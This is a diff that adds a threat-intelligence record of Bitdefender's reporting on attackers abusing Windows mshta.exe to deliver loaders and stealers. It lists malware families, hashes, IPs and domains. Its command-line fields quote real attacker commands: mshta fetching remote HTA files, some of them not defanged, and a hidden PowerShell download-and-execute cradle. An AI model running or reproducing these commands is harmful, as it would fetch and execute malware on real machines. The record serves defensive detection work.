@@ -1,0 +1,82 @@
+title: Bitdefender security researchers have discovered that attackers continue to
+  exploit Microsoft HTML Application Host (MSHTA)
+description: Attackers abuse MSHTA, a legacy utility on Windows systems, to execute
+  VBScript and JavaScript from local or remote files, delivering various malware including
+  commodity stealers and advanced threats.
+attribution: ''
+malware_families:
+- CountLoader
+- Emmenhtal Loader
+- ClipBanker
+- PurpleFox
+cves: []
+ttps:
+  processes:
+  - mshta.exe
+  - msiexec.exe
+  command_lines:
+  - mshta[.]exe hxxps[://]buck2nd[.]oss-eu-central-1[.]aliyuncs[.]com/dir/sixth/singl6[.]mp4
+  - Start-Process "C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell[.]exe" -ArgumentList
+    "-w hidden -ep bypass -nop -Command `"iex ((New-Object System[.]Net[.]WebClient).DownloadString('hxxps[://]klipdiheqoe[.]shop/ruwkl[.]png'))`""
+    -WindowStyle Hidden
+  - mshta.exe hxxps://asq.d6shiiwz.pw/win/hssl/d6.hta
+  - mshta.exe hxxps://asd.s7610rir.pw/win/checking.hta
+  - mshta.exe hxxps://d1.pool4883.pw/win/hssl/r7.hta
+  - mshta.exe hxxp://us1.somepools555.pw/win/checking.hta
+  powershell:
+  - Start-Process "C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell[.]exe" -ArgumentList
+    "-w hidden -ep bypass -nop -Command `"iex ((New-Object System[.]Net[.]WebClient).DownloadString('hxxps[://]klipdiheqoe[.]shop/ruwkl[.]png'))`""
+    -WindowStyle Hidden
+  scripts:
+  - '{[Text.Encoding]::UTF8.GetString(...)}'
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - mshta.exe -> google-services[.]cc:443
+  - mshta.exe -> memory-scanner[.]cc:443
+  - iso2022.exe -> planetitude[.]org/wp-admin/chellenge/stats.location:80
+  - iso2022.exe -> alpha-centavr[.]cc:80
+  - mshta.exe -> 187.96.21.84:80
+  - msiexec.exe -> 58.221.252.210:80
+  file_activity:
+  - UserDownloads2\Setup.exe
+  - \Lib\encodings\__init__.py
+  - \Lib\encodings\aliases.py
+  persistence: []
+  process_relations: []
+iocs:
+  hashes:
+  - 1e0e375f3ee82d5af5dfe6f7df0e2fac9a7d37c67add3390d05a93afd85b7c84
+  - 333e2192f2551415659fb4094e81b911708921bb588eecf65e27f51c9938dfc2
+  - 38fe562136ade372fc4cedde67826aeea8404e93a54a4a4736ddb4c8c8d4c96d
+  ip_addresses:
+  - 185[.]208[.]159[.]199
+  - 87[.]96[.]21[.]84
+  - 58[.]221[.]252[.]210
+  domains:
+  - google-services[.]cc
+  - memory-scanner[.]cc
+  - planetitude[.]org
+  - alpha-centavr[.]cc
+  - humancheck[.]shop
+  - pass-this-step-to-continue[.]html
+  - buck2nd[.]oss-eu-central-1[.]aliyuncs[.]com
+  - klipdiheqoe[.]shop
+  - asq.d6shiiwz.pw
+  - asd.s7610rir.pw
+  - d1.pool4883.pw
+  - us1.somepools555.pw
+  - sabruptyopsn.shop
+  - 94cloudewahsj.shop
+  - 94framekgirus.shop
+  - grooveoiy.cyou
+  - nearycrepso.shop
+  - rabidcowse.shop
+  urls:
+  - hxxps[://]buck2nd[.]oss-eu-central-1[.]aliyuncs[.]com/dir/sixth/singl6[.]mp4
+  - hxxps[://]klipdiheqoe[.]shop/ruwkl[.]png
+authors:
+- Bitdefender security researchers
+reference: https://www.bitdefender.com/en-us/blog/labs/microsofts-mshta-legacy-malware-windows
+date_of_publication: May 20, 2026
+file_creation_date: May 20, 2026
